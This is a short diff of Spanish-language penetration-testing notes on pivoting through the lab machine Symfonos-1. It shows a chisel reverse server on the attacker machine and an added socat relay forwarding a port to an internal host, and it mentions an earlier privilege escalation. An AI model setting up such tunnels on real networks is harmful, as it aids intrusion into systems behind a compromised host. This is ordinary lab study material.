@@ -514,8 +514,13 @@ explotando este binario logramos conseguir una bash con privilegios elevados
 	*Maquina Attack*
 	./chisel server --reverse -p 8000	
 
-	*Maquina Symfonos-1*
+	*Servidor Python: el servidor debe estar a la escucha en el mismo puerto donde se *
 	
+
+	*Maquina Symfonos-1*
+	./socat TCP-LISTEN:1331,fork TCP:10.0.2.4:6666
+
+
 ```
 
 [GraficoPivoting](obsidian://open?vault=ObsidianGIT&file=Excalidraw%2FPivoting.excalidraw) 
